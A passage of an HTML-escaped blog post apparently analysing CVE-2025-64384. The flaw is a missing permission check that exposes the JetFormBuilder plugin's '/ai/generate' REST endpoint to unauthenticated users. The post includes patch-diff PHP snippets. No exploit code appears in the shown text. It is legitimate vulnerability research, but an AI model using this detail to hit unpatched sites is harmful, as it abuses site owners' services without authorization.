3.5.3&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-64384&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-64384&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/jetformbuilder/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress JetFormBuilder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;JetFormBuilder&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.4&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;Perform code diff:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/diff.png&#34; title=&#34;Difference between the vulnerable and patched versions&#34; data-thumbnail=&#34;/posts/2025-12-09-cve-2025-64384/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Difference between the vulnerable and patched versions&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-09-cve-2025-64384/diff.png&#39; alt=&#34;Diff&#34; height=&#34;820&#34; width=&#34;1535&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Difference between the vulnerable and patched versions&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Vulnerable version (v3.5.3):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;Generate_Form_Endpoint&lt;/code&gt; class contains functions that return the corresponding values used to register the REST API in WordPress:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;route: &lt;code&gt;/ai/generate&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;method: &lt;code&gt;POST&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;callback: &lt;code&gt;run_callback&lt;/code&gt; used to generate forms with AI, with a limit of (15 requests / month)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/ai.png&#34; title=&#34;Form generation with AI&#34; data-thumbnail=&#34;/posts/2025-12-09-cve-2025-64384/ai.png&#34; data-sub-html=&#34;&lt;h2&gt;AI&lt;/h2&gt;&lt;p&gt;Form generation with AI&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-09-cve-2025-64384/ai.png&#39; alt=&#34;AI&#34; height=&#34;875&#34; width=&#34;1026&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Form generation with AI&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This is the function used to register a new endpoint for the REST API. The basic structure is as follows:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;register_rest_route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$namespace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$args&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;bool&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$override&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$namespace&lt;/code&gt;: Namespace for the route, usually the name of the plugin or module.&#xA;Example: &lt;code&gt;&amp;quot;myplugin/v1&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$route&lt;/code&gt;: The endpoint path (after the namespace).&#xA;Example: &lt;code&gt;&amp;quot;/items&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$args&lt;/code&gt;: Configuration array for the route, including:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;methods&lt;/code&gt;: HTTP methods (GET, POST, PUT, DELETE&amp;hellip;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;callback&lt;/code&gt;: Function executed when the endpoint is called.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;permission_callback&lt;/code&gt;: Function to check access permissions.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;args&lt;/code&gt;: (optional) Parameters passed to the endpoint.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;$override&lt;/code&gt;: Default is &lt;code&gt;false&lt;/code&gt;. If &lt;code&gt;true&lt;/code&gt;, it will override an existing route.&lt;/p&gt;&#xA;&lt;p&gt;By examining the functions in the &lt;code&gt;Generate_Form_Endpoint&lt;/code&gt; class, we can see that if the API is registered, it lacks the &lt;code&gt;permission_callback&lt;/code&gt; component to check access permissions. This allows all users (including unauthenticated users) to call this endpoint and freely use the AI form generation feature.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version (v3.5.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Generate_Form_Endpoint&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;extends&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Rest_Api_Private_Endpoint_Base&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It indirectly extends &lt;code&gt;Rest_Api_Endpoint_Base&lt;/code&gt; through &lt;code&gt;Rest_Api_Private_Endpoint_Base&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;abstract&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Rest_Api_Private_Endpoint_Base&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;extends&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Rest_Api_Endpoint_Base&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;check_permission&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;bool&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;edit_jet_fb_forms&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;admin&amp;ensp;only&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;check_permission&lt;/code&gt; is created to override the &lt;code&gt;check_permission&lt;/code&gt; method of &lt;code&gt;Rest_Api_Endpoint_Base&lt;/code&gt;, ensuring that it is restricted to admin users.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;abstract&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Rest_Api_Endpoint_Base&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;implements&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Rest_Fetch_Endpoint&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;check_permission&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;bool&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;permission_callback:&amp;ensp;true&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;p&gt;The plugin registered an action hook:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;rest_api_init&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;register_routes&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;rest_api_init&lt;/code&gt;: This hook is triggered when WordPress initializes the &lt;strong&gt;REST API&lt;/strong&gt;, at which point the &lt;code&gt;register_routes&lt;/code&gt; callback is executed:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;register_routes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;routes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$route&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$endpoint_args&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$route&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_overridden_args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;methods&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$route&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_methods&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;callback&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;run_callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;permission_callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;check_permission&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;args&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$route&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_common_args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;register_rest_route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$route&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_namespace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;jet-form-builder/v1/&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span 